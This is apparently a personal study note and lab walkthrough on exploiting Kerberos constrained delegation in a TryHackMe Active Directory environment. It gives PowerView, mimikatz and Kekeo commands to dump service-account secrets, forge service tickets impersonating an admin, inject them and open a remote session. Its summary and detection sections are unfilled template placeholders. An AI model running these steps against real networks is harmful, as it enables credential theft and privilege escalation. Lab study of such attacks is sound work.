---
{"dg-publish":true,"permalink":"/cards/red-team/exploiting-kerberos-delegation/"}
---

~ [[Exploiting Active Directory\|Exploiting Active Directory]]
## Summary
---
**What it is:** One-line definition of the technique, tool, or concept.  

**Scope:** What this note covers (and optionally what it does *not*).  

**Prerequisites:** [[cards/active-directory/Kerberos Delegation\|Kerberos Delegation]].

**Risks & Limitations:**

**Key Topics:** Links to prerequisite notes, related concepts, or parent techniques.  

## How it works (2–4 lines)
Concise description of the mechanism (protocol/architecture), plus the legitimate admin touchpoints attackers reuse.

## Steps (red — hands on)
---
Read [[cards/active-directory/Kerberos Delegation\|Kerberos Delegation]], [[cards/active-directory/Kerberos Delegation#Constrained vs Unconstrained\|Constrained vs Unconstrained]] and [[cards/active-directory/Kerberos Delegation#Resource-Based Constrained Delegation\|Resource-Based Constrained Delegation]].
### Constrained Delegation Exploitation
---

1. Enumerate available delegation, we can use PowerSploit's `Get-NetUser` cmdlet:

```C
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth
```

Output:

![Exploiting Kerberos Delegation.png](/img/user/cards/red-team/images/Exploiting%20Kerberos%20Delegation.png)

The `msds...` output tells that the user `svcISS` is allowed to impersonate any user BUT ONLY when accessing these services on THMSERVER1:

- HTTP service
- WSMAN service.

But HTTP does not mean it must be a web server only:

> On Windows, many services use HTTP as their communication transport _even if they are not websites_.

PowerShell Remoting (WinRM) = WSMAN, WSMAN runs **over HTTP and HTTP/HTTPS ports** and is used by:

- Enter-PSSession
- Invoke-Command
- WinRM
- PowerShell Remoting

The ideal option would be to **impersonate a Tier 1 Admin** since this would provide us with administrative access over THMSERVER1. But you are currently on THMWORK1.

This is where **proper** post exploitation enumeration is crucial: (in this example) you would find a service on the host running as the `svcIIS` user. **This requires administrative access**, you can dump the `LSASecrets`, part of the Windows Registry Hive where credentials are stored for features such as Windows services using `mimikatz`.

```C
mimikatz.exe
```

**Note:** this (entire mimikatz command) will not work using the provided credentials, to check if your "new" account has administrative privileges:

```C
whoami /priv // MANY MANY Privileges
whoami /groups | findstr /i "S-1-5-32-544" // Belongs to BUILTIN/ADMIN
```

Then next:

```C
token::elevate
lsadump::secrets
```

- `token::elevate` - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
- `lsadump::secrets` - Mimikatz interacts with the registry hive to pull the clear text credentials.

In the output: select or find the **user** who can impersonate any user on specific services **accessing THMSERVER1**, in this case `svcIIS`:

```C       
Secret  : _SC_thmwinauth / service 'thmwinauth' with username : svcIIS@za.tryhackme.loc 
cur/text: Password1@
```

#### It's time to perform Kerberos Delegation Attack
---
It's important to exit out after the `token::elevate` command, otherwise the tickets will be loaded into the wrong context.

You will use `Kekeo` to generate our tickets and then use `Mimikatz` to load those tickets into memory:

```
kekeo.exe
```

Next generate a TGT that can be used to generate tickets for the HTTP and WSMAN services:

```C
tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:<REPLACE_WITH_PASW>
```

- user - The user who has the constrained delegation permissions.
- domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
- password - The password associated with the svcIIS account.

Part of the output:

```C
Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi' 
```

Now that you have the TGT for the account that can perform delegation, you can forge TGS requests for the account you want to impersonate. You need to perform this for both HTTP and WSMAN to allow you to create a PSSession on THMSERVER1:

```C
tgs::s4u /tgt:<REPLACE_WITH_FILE_PREV_OUTPUT> /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
```

- `tgt` - You provide the TGT that we generated in the previous step.
- `user` - The user you want to impersonate. Since t2_ accounts have administrative access over workstations, it is a safe assumption that t1_ accounts will have administrative access over servers, so choose a t1_ account that you would like to impersonate.  
- `service` - The services you want to impersonate using delegation. You first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.

Output:

![Exploiting Kerberos Delegation-1.png](/img/user/cards/red-team/images/Exploiting%20Kerberos%20Delegation-1.png)

```C
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_WSMAN~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
```

Then use `Mimikatz` to import them:

```
privilege::debug
```

Replace and repeat using the two tickets:

```C
kerberos::ptt <TICKET>
```

Exit mimikatz and run `klist` to verify that the tickets were imported:

![Exploiting Kerberos Delegation-2.png](/img/user/cards/red-team/images/Exploiting%20Kerberos%20Delegation-2.png)

Now that the tickets are imported, we can finally create our `PSSession` on **THMSERVER1**:

```C
New-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

Then:

```C
Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
```

Output:

![Exploiting Kerberos Delegation-3.png](/img/user/cards/red-team/images/Exploiting%20Kerberos%20Delegation-3.png)

With the exploitation of Constrained Delegation, you now have privileged access to **THMSERVER1!**

## Concept/Technique 2
---
Add more if needed.

## Blue — Detection & Response (concise)
---

- **Top indicators (TL;DR):** bullet list (EventIDs, processes, ports, log fields).  
- **Quick queries / detection ideas:** 1–3 pseudo queries or logic lines.  
- **Immediate response checklist:** 3 bullets (isolate, collect, escalate).


